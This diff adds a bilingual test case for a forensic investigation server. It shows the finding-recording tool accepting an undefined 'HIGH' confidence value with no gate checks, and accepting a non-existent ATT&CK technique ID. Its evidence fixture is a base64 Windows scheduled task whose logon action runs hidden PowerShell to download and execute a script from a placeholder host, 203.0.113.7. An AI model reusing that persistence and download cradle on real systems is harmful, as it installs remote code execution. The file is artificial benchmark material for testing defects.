@@ -1,0 +1,102 @@
+# Matrix case P2061-057: misc_record_finding documents confidence as
+# CONFIRMED / LIKELY / SUSPECTED / UNCONFIRMED but never checks the value, so
+# a finding recorded as 'HIGH' passes with no tier gate at all, while the
+# same finding as CONFIRMED is refused. The MITRE gate records a technique id
+# missing from the table as "unvalidated" when the table has fewer than 600
+# techniques, and the table trudi ships (cases/.common/mitre_techniques.json,
+# which install.sh copies to ~/cases/.common) has 486, so a non-existent
+# sub-technique (T1053.009) is recorded.
+# TRUDI_MITRE_TABLE points at that shipped table. The investigation is
+# resumed from a trace whose previous dair_assess moved it into Collect (the
+# bench has no DAIR backend key; record_finding needs a recent dair_call).
+case_id: P2061-057
+problem: P2061
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: response
+level: mcp
+realism: possible
+realism_ko: "confidence는 스키마상 자유 문자열이라 모델이 네 값 대신 흔한 HIGH·MEDIUM·LOW 표기를 넣을 수 있고, 하위 기법 번호를 지어내는 일도 있다. trudi가 함께 배포하는 기법 표는 486개라 표가 작은 조건은 기본 설치에서 늘 성립한다."
+coverage: 'partial: the phase comes from a resumed trace (one dair_call entry in the shape the server writes), because the bench has no DAIR backend key'
+coverage_ko: DAIR 백엔드 키가 없어 이전 세션의 dair_assess 기록 한 건이 든 trace를 이어서 열어 단계를 만든다.
+summary: misc_record_finding refuses a scheduled-task finding as CONFIRMED but records the same finding as confidence 'HIGH' with an empty gate chain, and records a finding citing the non-existent technique T1053.009 because the shipped ATT&CK table has only 486 techniques.
+summary_ko: '`misc_record_finding`은 예약 작업 발견을 CONFIRMED로는 거부하지만 같은 발견을 정의에 없는 `HIGH`로 주면 관문 없이(`gate_chain: {}`) 기록한다. 기본 기법 표가 486개뿐이라 없는 기법 T1053.009를 단 발견도 기록된다.'
+defect_ko: 이 서버는 `confidence`를 네 값과 대조하지 않아 정의에 없는 값이면 등급별 관문을 하나도 거치지 않고, 기법 표가 작으면 없는 기법 ID도 받아 준다. 정상이라면 정의에 없는 확신도와 없는 기법 ID를 거부해야 한다. 모델과 보고서는 관문을 통과한 높은 확신의 발견, 실제 있는 기법으로 잘못 안다.
+setup_ko: powershell로 http://203.0.113.7/a.ps1을 받는 예약 작업 파일을 넣고, 이전 세션에서 Collect 단계로 넘어간 trace를 이어서 연다. 기법 표는 trudi가 배포하는 표를 쓴다.
+env:
+  TRUDI_MITRE_TABLE: /opt/trudi/cases/.common/mitre_techniques.json
+fixture:
+- path: case01/analysis/trace.json
+  root: outside
+  text: "{\n  \"case_id\": \"CASE-001\",\n  \"entries\": [\n    {\n      \"call_id\": 1,\n      \"type\": \"dair_call\",\n      \"ts\": \"2026-11-27T09:12:40Z\",\n      \"current_phase\": \"Triage\",\n      \"phase_rationale\": \"Initial alert triaged; scope the host artifacts next.\",\n      \"transition_recommended\": true,\n      \"next_phase\": \"Collect\",\n      \"transition_rationale\": \"Triage complete; collect registry and event logs.\",\n      \"stack_action\": \"push\",\n      \"investigation_focus\": \"Collect registry hives and event logs from WKSTN-07.\",\n      \"verification_satisfied\": true,\n      \"verification_challenges\": [],\n      \"recommended_actions\": [],\n      \"directives\": {\"priority_tools\": [], \"skip_tools\": [], \"focus_pids\": [], \"focus_paths\": []},\n      \"input_tokens\": 3120,\n      \"output_tokens\": 410,\n      \"phase\": \"Collect\"\n    }\n  ]\n}\n"
+# Task Scheduler XML as Windows writes it (UTF-16LE with BOM, CRLF): logon
+# trigger, hidden PowerShell download cradle from 203.0.113.7.
+- path: C/Windows/System32/Tasks/OneDriveUpdater
+  base64: //48AD8AeABtAGwAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4AMAAiACAAZQBuAGMAbwBkAGkAbgBnAD0AIgBVAFQARgAtADEANgAiAD8APgANAAoAPABUAGEAcwBrACAAdgBlAHIAcwBpAG8AbgA9ACIAMQAuADIAIgAgAHgAbQBsAG4AcwA9ACIAaAB0AHQAcAA6AC8ALwBzAGMAaABlAG0AYQBzAC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvAHcAaQBuAGQAbwB3AHMALwAyADAAMAA0AC8AMAAyAC8AbQBpAHQALwB0AGEAcwBrACIAPgANAAoAIAAgADwAUgBlAGcAaQBzAHQAcgBhAHQAaQBvAG4ASQBuAGYAbwA+AA0ACgAgACAAIAAgADwARABhAHQAZQA+ADIAMAAyADQALQAxADAALQAyADcAVAAwADMAOgA0ADEAOgAxADIAPAAvAEQAYQB0AGUAPgANAAoAIAAgACAAIAA8AEEAdQB0AGgAbwByAD4AVwBLAFMAVABOAC0AMAA3AFwAagBkAG8AZQA8AC8AQQB1AHQAaABvAHIAPgANAAoAIAAgACAAIAA8AFUAUgBJAD4AXABPAG4AZQBEAHIAaQB2AGUAVQBwAGQAYQB0AGUAcgA8AC8AVQBSAEkAPgANAAoAIAAgADwALwBSAGUAZwBpAHMAdAByAGEAdABpAG8AbgBJAG4AZgBvAD4ADQAKACAAIAA8AFQAcgBpAGcAZwBlAHIAcwA+AA0ACgAgACAAIAAgADwATABvAGcAbwBuAFQAcgBpAGcAZwBlAHIAPgANAAoAIAAgACAAIAAgACAAPABFAG4AYQBiAGwAZQBkAD4AdAByAHUAZQA8AC8ARQBuAGEAYgBsAGUAZAA+AA0ACgAgACAAIAAgADwALwBMAG8AZwBvAG4AVAByAGkAZwBnAGUAcgA+AA0ACgAgACAAPAAvAFQAcgBpAGcAZwBlAHIAcwA+AA0ACgAgACAAPABBAGMAdABpAG8AbgBzACAAQwBvAG4AdABlAHgAdAA9ACIAQQB1AHQAaABvAHIAIgA+AA0ACgAgACAAIAAgADwARQB4AGUAYwA+AA0ACgAgACAAIAAgACAAIAA8AEMAbwBtAG0AYQBuAGQAPgBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQA8AC8AQwBvAG0AbQBhAG4AZAA+AA0ACgAgACAAIAAgACAAIAA8AEEAcgBnAHUAbQBlAG4AdABzAD4ALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADcALwBhAC4AcABzADEAJwApACIAPAAvAEEAcgBnAHUAbQBlAG4AdABzAD4ADQAKACAAIAAgACAAPAAvAEUAeABlAGMAPgANAAoAIAAgADwALwBBAGMAdABpAG8AbgBzAD4ADQAKADwALwBUAGEAcwBrAD4ADQAKAA==
+steps:
+- tool: misc_start_execution_log
+  note_ko: '준비: 이전 세션의 사건 기록(Collect 단계)을 이어서 연다'
+  args:
+    case_id: CASE-001
+    output_path: ${OUTSIDE}/case01/analysis/trace.json
+    case_dir: ${OUTSIDE}/case01
+    launch_dashboard: false
+- tool: strings_grep
+  args:
+    file_path: ${EVIDENCE}/C/Windows/System32/Tasks/OneDriveUpdater
+    pattern: DownloadString
+    encoding: utf16le
+  note_ko: '준비: 예약 작업 파일(UTF-16)에서 다운로드 명령을 찾는다(근거 호출, call_id 4)'
+- tool: misc_record_finding
+  note_ko: '비교 호출: 같은 내용을 정의된 값 ''CONFIRMED''로 기록한다'
+  args:
+    description: Scheduled task OneDriveUpdater runs hidden PowerShell that downloads http://203.0.113.7/a.ps1 at logon (T1053.005).
+    confidence: CONFIRMED
+    source: strings.grep
+    linked_call_id: 4
+    techniques: &id001
+    - T1053.005
+    claim_kind: positive
+    category: persistence
+    act: persistence_install
+- tool: misc_record_finding
+  args:
+    description: Scheduled task OneDriveUpdater runs hidden PowerShell that downloads http://203.0.113.7/a.ps1 at logon (T1053.005).
+    confidence: HIGH
+    source: strings.grep
+    linked_call_id: 4
+    techniques: *id001
+    claim_kind: positive
+    category: persistence
+    act: persistence_install
+  note_ko: '결함 호출: confidence를 네 값에 없는 ''HIGH''로 기록한다'
+- tool: misc_record_finding
+  args:
+    description: Scheduled task OneDriveUpdater runs hidden PowerShell at logon.
+    confidence: SUSPECTED
+    source: strings.grep
+    linked_call_id: 4
+    techniques:
+    - T1053.009
+  note_ko: '결함 호출: 표에 없는 기법 ID T1053.009로 발견을 기록한다'
+- tool: correlate_mitre_validate
+  args:
+    technique_id: T1053.009
+  note_ko: '비교 호출: 같은 기법 ID가 표에 있는지 확인한다'
+expect:
+- step: 3
+  note_ko: 같은 발견을 CONFIRMED로 주면 근거 관문에서 거부된다
+  contains: '"gate": "evidence_strength"'
+- step: 4
+  note_ko: confidence 'HIGH'로 준 발견은 기록된다
+  regex: '"success": true, "description": "Scheduled task OneDriveUpdater[^"]*", "confidence": "HIGH"'
+- step: 4
+  note_ko: HIGH 발견은 어떤 관문도 거치지 않았다
+  contains: '"gate_chain": {}'
+- step: 5
+  note_ko: 없는 기법 T1053.009를 단 발견이 표 미완성을 이유로 기록된다
+  regex: '"success": true.*"technique_id": "T1053.009", "name": "", "tactic": "", "unvalidated": true, "reason": "table_incomplete", "table_size": 486'
+- step: 6
+  note_ko: 표에는 T1053.009가 없다
+  contains: '"exists": false, "technique_id": "T1053.009", "available_count": 486'
